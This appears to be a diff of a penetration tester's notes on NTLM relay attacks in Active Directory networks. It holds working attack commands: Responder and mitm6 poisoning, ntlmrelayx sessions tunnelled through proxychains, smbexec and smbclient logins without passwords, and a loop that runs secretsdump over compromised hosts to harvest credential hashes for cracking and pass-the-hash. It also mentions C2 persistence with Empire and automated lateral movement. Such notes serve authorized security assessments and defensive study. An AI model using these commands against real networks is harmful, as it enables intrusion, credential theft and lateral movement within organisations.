@@ -3,17 +3,24 @@ Name Service Poisoning and Relay :::::::::::
 Tools:
 proxychains
 mitm6
-responder (also includes multirelay, RunFinger.py) -- landx repo
+responder (also includes multirelay, RunFinger.py)
 Impacket tools (ntlmrelayx , secrets.py , smb clients , psexec client)
 
 ------------------------------------------------------------------------------
 ## make sure to modify proxychains config file at /etc/proxychains.conf ##
---This is for when ntlmrelayx.py binds the relayed sessions to sockets
+--This is for when ntlmrelayx.py binds the relayed sessions to sockets, proxychains needs to know where to look for said sockets--
 			-At the bottom of the file::
 					[ProxyList]
 					socks4 <scanner-ip> 1080
-**proxychains python smbexec.py CORP/<domain>@10.100.4.174 --no-pass**					
+										
+**proxychains python smbexec.py <domain>/<username>@10.100.4.174 --no-pass**					
 ------------------------------------------------------------------------------					
+Impackets example scripts that work with SMB sockets::
+smbclient.py
+secretsdump.py
+atexec.py
+wmiexec.py
+------------------------------------------------------------------------------
 General steps (after installation):::
 
 This will only work for hosts that have SMB signing disabled, DC's have this enabled by default so keep that in mind. To identify hosts that have smb signing disabled. To do this we use runfinger.py, included in the responder repo.
@@ -36,16 +43,16 @@ Secretsdump.py::::
 - Dumps credentials and other sensitive information via multiple avenues, SAM files, lsass process, memory, kerberos misconfiguration, etc ..
 - Crack cached domain credentials with hashcat
 - Use pass the hash techniques with local machine hashes found in secrets dump to laterally move around the network
-- Use PSexec module in metasploit with local computer hashes $$$acounts
+- Use PSexec module in metasploit with local computer account hashes ($acounts) and local user sam hashes
 
 
-Connect to socket via smb-client , can connect to shares, creat files/remove files:::
-1. proxychains python ./smbclient.py CORP/PASERVICE@10.100.4.141
-		--make sure you edit /etc/proxychains.conf and add your socket, its gonna be the scanner IP and port 1080
+Connect to socket via smb-client , can connect to shares, create files/remove files, find sensitive files:::
+1. proxychains python ./smbclient.py <domain>/<username>@10.100.4.141
+		--make sure you edit /etc/proxychains.conf and add your socket, its going to be the scanner IP and port 1080
 
 Pulling and Parsing "Cached Domain Credentials" from Secrets.py:::
 1. Break connected sockets into a list, clean that list so that each host is on a new line
-2. for i in $(cat comp.txt); do proxychains ./secretsdump.py -no-pass CORP/<username>@$i >> hashes/hashdump$i ; done
+2. for i in $(cat comp.txt); do proxychains ./secretsdump.py -no-pass <domain>/<username>@$i >> hashes/hashdump$i ; done
 4. scp traceadmin@10.100.1.71:/home/traceadmin/Responder/impacket/examples/hashdump10.100.4.141 ./
 5. for i in $(cat compromised.txt); do echo ; cat hashdump ; echo ; cut -d ":" -f 2 hashdump >> cleaned.txt ; done
 6. sort myfile.txt | uniq >> finalhashlist.txt          :: removes duplicates
@@ -74,7 +81,7 @@ Future work regarding this:
 --Create script to parse and clean secretsdump better
 --Better way to deal with needing multiple process (tmux is a pain)
 --Incorporate empire or another C&C infrastructure to persist these hosts throughout the assessment (ntlmrelayx just creates so many connections it can be messy at times)
---Bloodhound to really make this easy wins
+--Bloodhound && deathstar to automate lateral movement && priv escalation
 
 References:
 https://www.secureauth.com/blog/playing-relayed-credentials
@@ -84,7 +91,11 @@ https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
 Extras::
 Use ldap:// on ntlmrelayx to dump active directory > target those users with multirelay 
 
-Random Examples::
+Troubleshooting::
+-if impacket/example scripts are running and giving no output, try rebuilding impacket library
+-
+
+Examples::
 -------------------------------------------------------------------------------------------------
 proxychains python smbexec.py CORP/<domain>@10.100.4.174 --no-pass
 
